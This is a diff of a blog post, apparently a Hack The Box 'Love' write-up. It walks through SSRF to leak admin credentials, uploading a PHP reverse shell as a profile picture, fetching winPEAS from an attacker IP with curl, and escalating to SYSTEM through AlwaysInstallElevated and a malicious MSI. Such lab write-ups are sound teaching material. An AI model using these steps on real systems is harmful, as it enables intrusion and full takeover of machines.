@@ -104,7 +104,7 @@ One of the first things we see is the DNS name given as `love.htb` and `staging.
 
 When we land on this virtual host, we see a file scanning service. WE even have the option to demo the software. The page is asking for a URL to scan. So we setup a `netcat` listener on our local machine and point it to that URL.
 
-{{< figure src="__GHOST_URL__/content/images/2021/05/image-35.png" >}}
+![](/images/2021/05/image-35.png)
 
 Interesting. So, to test this further, we can create a file and see what happens when the URL is a file. We simple create a file with touch, populate it with junk data and host it. We then use the demo to read the file and get whatever it might tell us about the file.
 
@@ -113,11 +113,11 @@ Commands:
 `echo 'hi' > 1.lst`
 `simple` (This is an alias'd to `SimpleHTTPServer` for me)
 
-{{< figure src="__GHOST_URL__/content/images/2021/05/love_test.gif" >}}
+![](/images/2021/05/love_test.gif)
 
 So we know that it will read the contents of whatever the item we supply is. So my thought here is to let this demo read the pages that were forbidden to us earlier. If the server is trying to query itself, it's likley we won't get forbidden. Port 443 didn't yield anything, however port 5000 did!
 
-{{< figure src="__GHOST_URL__/content/images/2021/05/image-36.png" >}}
+![](/images/2021/05/image-36.png)
 
 Awesome, we have some credentials `admin`:`@LoveIsInTheAir!!!!`. Now we need to identify where we can use them. They don't work in the standard entry form. To dig a bit more we'll use `gobuster` to help enumerate more.
 
@@ -126,18 +126,18 @@ Command:
 
 We find an `admin` directory.
 
-{{< figure src="__GHOST_URL__/content/images/2021/05/image-37.png" >}}
+![](/images/2021/05/image-37.png)
 
 Awesome, the credentials work on this interface! Once we're in the admin portal, we look around for additional ways to pivot. After looking around, it seems like uploading a shell as a user profile picture could be a valid method. There are many `php shells` out there, pick one you [like](https://github.com/pentestmonkey/php-reverse-shell).
 
-{{< figure src="__GHOST_URL__/content/images/2021/05/love_shell.gif" >}}
+![](/images/2021/05/love_shell.gif)
 
 We setup our listen and catch a connection back immediately. We then navigate to `Phoebe`'s Desktop and snag the `user.txt` flag! Awesome, now it's time to start enumerating so we can find a path forward. We'll spin up a `SimpleHTTPServer` and transfer over `winPEAS`. A quick check shows we have `curl` on the system, we'll use that to get our file.
 
 Command:
 `curl http://10.10.14.125/winPEAS.bat -o wp.bat`
 
-{{< figure src="__GHOST_URL__/content/images/2021/05/image-39.png" >}}
+![](/images/2021/05/image-39.png)
 
 That takes quite a while to run, but after sifting through the results, it looks like we can use `AlwaysInstallElevated` to [escalate](https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path).
 
@@ -151,7 +151,7 @@ Once that is generated, we can host it via `SimpleHTTPServer` and download it on
 Command:
 `msiexec /quiet /qn /i C:\Users\Phoebe\Downloads\rm.msi`
 
-{{< figure src="__GHOST_URL__/content/images/2021/05/image-38.png" >}}
+![](/images/2021/05/image-38.png)
 
 We catch a shell back as `system`! Let's get the `root.txt` flag and we have completed the box!
 
